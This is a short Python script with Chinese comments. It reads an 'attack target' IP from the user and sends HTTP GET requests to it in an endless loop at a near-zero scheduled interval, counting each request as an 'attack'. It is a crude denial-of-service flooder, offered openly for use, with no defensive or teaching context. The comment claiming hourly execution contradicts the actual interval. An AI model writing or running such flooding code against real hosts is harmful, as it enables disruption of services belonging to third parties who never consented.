import requests
import schedule
import time
import socket

def get_ipv4_address():
    # 获取主机名
    hostname = socket.gethostname()
    # 获取主机名对应的IP地址
    ipv4_address = socket.gethostbyname(hostname)
    return ipv4_address

# 调用函数并打印本机IPv4地址
ipv4_address = get_ipv4_address()
print(f"本机IPv4地址：{ipv4_address}")
ip_address = input("攻擊目標:")# 请替换为你想要访问的IP地址
w = 0

def visit_ip():
    global w  # 声明w为全局变量
    
    try:
        response = requests.get(f"http://{ip_address}")
        w += 1  # 修改变量w的值
        print(f"{ipv4_address}访问 {ip_address} 成功，状态码：{response.status_code}||第{w}次攻擊")
    except requests.RequestException as e:
        print(f"{ipv4_address}访问 {ip_address} 失败，错误信息：{e}")

# 每一个小时执行一次 visit_ip 函数
schedule.every(0.000000001).hours.do(visit_ip)

while True:
    schedule.run_pending()
   
